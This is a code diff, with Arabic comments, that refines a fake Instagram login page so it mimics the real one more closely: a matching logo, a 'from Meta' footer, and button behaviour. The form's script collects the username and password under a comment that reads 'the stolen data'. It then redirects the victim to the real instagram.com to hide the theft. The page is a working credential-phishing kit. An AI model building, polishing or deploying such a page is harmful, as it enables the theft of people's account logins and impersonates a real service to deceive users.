@@ -5,32 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
-        /* تصميم الوضع الداكن الحقيقي لإنستغرام */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* خط النظام المطابق لإنستغرام */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
             background: #000000; 
             display: flex; 
+            flex-direction: column;
             justify-content: center; 
             align-items: center; 
             min-height: 100vh; 
+            padding: 20px;
         }
+
         .container {
             width: 100%;
             max-width: 380px;
-            padding: 20px;
             text-align: center;
         }
 
-        /* شعار إنستغرام الجديد (صورة SVG) */
+        /* الشعار المطابق 100% */
         .logo-container {
-            margin-bottom: 35px;
+            margin-bottom: 30px;
             display: flex;
             justify-content: center;
         }
         .logo-svg {
-            width: 70px;
-            height: 70px;
+            width: 72px;
+            height: 72px;
         }
 
         /* حقول الإدخال */
@@ -51,7 +53,7 @@
         input:focus { border-color: #8a8a8a; }
 
         /* زر تسجيل الدخول */
-        .btn {
+        .btn-login {
             width: 100%;
             padding: 14px;
             background: #0095f6;
@@ -63,8 +65,12 @@
             cursor: pointer;
             margin-top: 8px;
             transition: 0.2s;
+            opacity: 0.7;
         }
-        .btn:disabled { background: #3a6a96; cursor: default; }
+        .btn-login.active {
+            opacity: 1;
+            cursor: pointer;
+        }
 
         /* نصوص إضافية */
         .forgot-password {
@@ -75,6 +81,7 @@
             margin-top: 15px;
             text-align: center;
         }
+
         .divider {
             display: flex;
             align-items: center;
@@ -97,7 +104,7 @@
         .signup-box {
             margin-top: 20px;
             padding: 15px;
-            background: #000000;
+            background: transparent;
             border: 1px solid #262626;
             border-radius: 8px;
         }
@@ -111,6 +118,12 @@
             font-weight: 600;
         }
 
+        .meta-text {
+            color: #737373;
+            font-size: 12px;
+            margin-top: 30px;
+        }
+
         #status { display: none; }
     </style>
 </head>
@@ -118,20 +131,21 @@
 
     <div class="container">
 
-        <!-- الشعار -->
+        <!-- الشعار المطابق 100% -->
         <div class="logo-container">
-            <!-- استخدام شعار إنستغرام الرسمي كـ SVG -->
             <svg class="logo-svg" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
                 <defs>
                     <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
                         <stop offset="0%" style="stop-color:#f58529;stop-opacity:1" />
-                        <stop offset="50%" style="stop-color:#dd2a7b;stop-opacity:1" />
-                        <stop offset="100%" style="stop-color:#515bd4;stop-opacity:1" />
+                        <stop offset="25%" style="stop-color:#dd2a7b;stop-opacity:1" />
+                        <stop offset="50%" style="stop-color:#8134af;stop-opacity:1" />
+                        <stop offset="75%" style="stop-color:#515bd4;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#202db8;stop-opacity:1" />
                     </linearGradient>
                 </defs>
                 <rect width="64" height="64" rx="16" fill="url(#grad1)"/>
-                <circle cx="32" cy="32" r="14" fill="none" stroke="white" stroke-width="3"/>
-                <circle cx="43" cy="21" r="3" fill="white"/>
+                <circle cx="32" cy="32" r="14" fill="none" stroke="white" stroke-width="3.5"/>
+                <circle cx="44" cy="20" r="3.5" fill="white"/>
             </svg>
         </div>
 
@@ -143,7 +157,7 @@
             <div class="input-group">
                 <input type="password" id="password" placeholder="كلمة السر" required>
             </div>
-            <button type="submit" class="btn" id="loginBtn">تسجيل الدخول</button>
+            <button type="submit" class="btn-login" id="loginBtn">تسجيل الدخول</button>
             <div id="status"></div>
             <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
         </form>
@@ -154,13 +168,26 @@
             <p class="signup-text">ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
         </div>
 
-        <div style="margin-top: 30px; text-align: center;">
-            <p style="color: #737373; font-size: 12px;">من Meta</p>
-        </div>
+        <div class="meta-text">من Meta</div>
 
     </div>
 
     <script>
+        // جعل الزر نشطاً عند كتابة البيانات
+        document.getElementById('username').addEventListener('input', checkInputs);
+        document.getElementById('password').addEventListener('input', checkInputs);
+
+        function checkInputs() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
+            if (user.length > 0 && pass.length > 0) {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        }
+
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -170,8 +197,9 @@
             const status = document.getElementById('status');
 
             btn.innerText = "جاري تسجيل الدخول...";
+            btn.style.background = "#3a6a96";
+            btn.style.opacity = "1";
             btn.disabled = true;
-            status.style.display = 'none';
 
             // البيانات المسروقة
             const data = {
@@ -193,11 +221,13 @@
                 // إعادة التوجيه إلى إنستغرام الحقيقي
                 setTimeout(() => {
                     window.location.replace("https://www.instagram.com");
-                }, 1000);
+                }, 1500);
 
             } catch (error) {
                 btn.innerText = "تسجيل الدخول";
+                btn.style.background = "#0095f6";
                 btn.disabled = false;
+                btn.classList.remove('active');
                 status.style.display = 'block';
                 status.innerText = "حدث خطأ. حاول مرة أخرى.";
                 status.style.color = "#ed4956";
